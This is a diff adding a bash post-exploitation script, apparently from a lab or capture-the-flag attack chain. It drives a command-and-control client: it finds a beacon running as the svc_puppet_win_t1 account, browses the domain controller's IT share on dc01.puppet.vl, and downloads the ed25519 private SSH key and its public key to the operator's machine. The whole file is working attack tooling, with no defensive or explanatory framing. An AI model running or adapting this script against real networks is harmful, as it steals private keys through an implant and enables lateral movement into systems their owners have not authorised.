@@ -1,0 +1,44 @@
+#!/bin/bash
+# c2-dcshare - Access DC IT share and download SSH keys
+# Finds the svc_puppet_win_t1 beacon automatically and downloads ed25519 keys
+
+DIR="$(dirname "$0")"
+C2="$DIR/c2"
+
+echo "=== DC SHARE ACCESS ==="
+
+# Step 1: Find svc_puppet_win_t1 beacon
+echo "[1/4] Finding svc_puppet_win_t1 beacon..."
+BEACON=$($C2 beacons 2>/dev/null | perl -nle'print $1 if /^ ([a-f0-9]{7})(?=.*svc_puppet_win_t1)/' | head -1)
+
+if [ -z "$BEACON" ]; then
+    echo "[!] No svc_puppet_win_t1 beacon found. Run c2-privesc first."
+    $C2 beacons 2>/dev/null
+    exit 1
+fi
+
+echo "[+] Found beacon: $BEACON"
+
+# Step 2: Access DC IT share
+echo "[2/4] Accessing DC IT share..."
+OUT=$($C2 run "$BEACON" ls '\\dc01.puppet.vl\it' 90 2>&1)
+
+if echo "$OUT" | grep -q "Error\|denied"; then
+    echo "[!] Access denied. Need svc_puppet_win_t1 context."
+    echo "$OUT" | grep "Error\|denied"
+    exit 1
+fi
+
+# Step 3: List .ssh directory
+echo "[3/4] Listing SSH keys..."
+OUT=$($C2 run "$BEACON" ls '\\dc01.puppet.vl\it\.ssh' 90 2>&1)
+echo "$OUT" | grep -E 'ed25519|\.pub|items' | head -5
+
+# Step 4: Download keys
+echo "[4/4] Downloading key pair..."
+$C2 run "$BEACON" download '\\dc01.puppet.vl\it\.ssh\ed25519' 120 2>&1 | grep -E 'Wrote|completed|Error' | head -3
+$C2 run "$BEACON" download '\\dc01.puppet.vl\it\.ssh\ed25519.pub' 120 2>&1 | grep -E 'Wrote|completed|Error' | head -3
+
+echo ""
+echo "[*] Done. Keys should be in current dir."
+ls -la "$DIR"/ed25519* 2>/dev/null || echo "Keys not found in $DIR"
